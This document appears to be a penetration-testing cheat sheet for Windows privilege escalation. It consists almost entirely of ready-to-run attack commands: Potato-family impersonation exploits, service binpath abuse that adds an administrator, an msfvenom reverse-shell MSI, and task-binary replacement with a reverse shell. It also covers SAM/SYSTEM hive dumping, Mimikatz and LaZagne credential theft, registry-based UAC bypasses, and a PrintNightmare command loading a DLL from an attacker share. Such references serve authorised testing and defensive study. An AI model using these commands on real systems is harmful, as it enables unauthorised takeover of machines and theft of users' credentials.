# Windows Privilege Escalation

## Initial Enumeration
```powershell
whoami /all
systeminfo
net user %username%
net localgroup administrators
ipconfig /all
netstat -ano
tasklist /svc
wmic qfe list brief
```

## Token Privileges Abuse
```powershell
whoami /priv
```
- **SeImpersonatePrivilege** (service accounts, IIS/MSSQL):
  - `PrintSpoofer.exe -i -c cmd` (Server 2016/2019/2022)
  - `GodPotato.exe -cmd "cmd /c whoami"` (all modern Windows)
  - `JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *` (Server 2016/Win10 < 1809)
  - `SweetPotato.exe -p cmd.exe -a "/c whoami"`
- **SeDebugPrivilege**: inject into LSASS or migrate to SYSTEM process
- **SeBackupPrivilege**: copy SAM/SYSTEM hives — `reg save HKLM\SAM C:\temp\sam` + `reg save HKLM\SYSTEM C:\temp\sys`
- **SeRestorePrivilege**: overwrite service binaries or DLLs
- **SeTakeOwnershipPrivilege**: take ownership of any file, then read/modify

## Service Misconfigurations
```cmd
sc qc <service>
accesschk.exe /accepteula -uwcqv "Authenticated Users" * /c
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```
- **Unquoted service path**: `C:\Program Files\My App\service.exe` → drop `C:\Program.exe` or `C:\Program Files\My.exe`
- **Weak service permissions**: `sc config <svc> binpath="cmd /c net localgroup administrators <user> /add"` then `sc start <svc>`
- **Writable service binary**: replace with payload, restart service
- **DLL hijacking**: use Process Monitor to find missing DLLs, drop malicious DLL in search path

## Registry Exploits
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
If both = 1: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=y -f msi -o rev.msi` then `msiexec /quiet /qn /i rev.msi`
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

## Scheduled Tasks
```cmd
schtasks /query /fo LIST /v | findstr /i "task\|run\|author"
icacls "C:\path\to\task\binary.exe"
```
If task binary is writable: replace with reverse shell, wait for execution.

## Credential Harvesting
```cmd
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\sys
secretsdump.py -sam sam -system sys LOCAL
```
```powershell
# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
# DPAPI
mimikatz.exe "dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\<guid>"
# LaZagne
LaZagne.exe all
# Credential Manager
cmdkey /list
runas /savecred /user:admin cmd.exe
```
```powershell
# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear
# Cached credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount
```

## UAC Bypass
```cmd
# fodhelper.exe (Win10+)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe
# eventvwr.exe
reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "cmd.exe" /f
eventvwr.exe
# CMSTPLUA COM object
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("3E5FC7F9-9A51-4367-9063-A120244FBEC7"))
$com.ShellExec("cmd.exe")
```

## Known CVEs
- **PrintNightmare** CVE-2021-34527: `SharpPrintNightmare.exe '\\attacker\share\evil.dll'` — adds driver DLL as SYSTEM
- **HiveNightmare/SeriousSAM** CVE-2021-36934: `icacls C:\Windows\System32\config\SAM` shows Builtin\Users:(I)(RX) → copy VSS shadow: `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam`
- **KrbRelayUp**: local privilege escalation via Kerberos relay + RBCD — `KrbRelayUp.exe relay -d domain.local -cn YOURPC$`
- **EfsPotato**: abuse EFS RPC for impersonation

## Automated Enumeration
```powershell
# WinPEAS
.\winPEASx64.exe quiet fast searchfast
# PowerUp
Import-Module .\PowerUp.ps1; Invoke-AllChecks
# Seatbelt
.\Seatbelt.exe -group=all
# SharpUp
.\SharpUp.exe audit
```

## Quick Wins Checklist
1. `whoami /priv` — SeImpersonatePrivilege = immediate SYSTEM via Potato family
2. Unquoted service paths with writable directories
3. AlwaysInstallElevated = 1 in both HKLM and HKCU
4. Stored credentials via `cmdkey /list` → `runas /savecred`
5. Readable SAM/SYSTEM backups or VSS copies
6. Service running as SYSTEM with weak binary/folder ACLs
7. Cleartext passwords in registry, config files, or PowerShell history (`%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`)
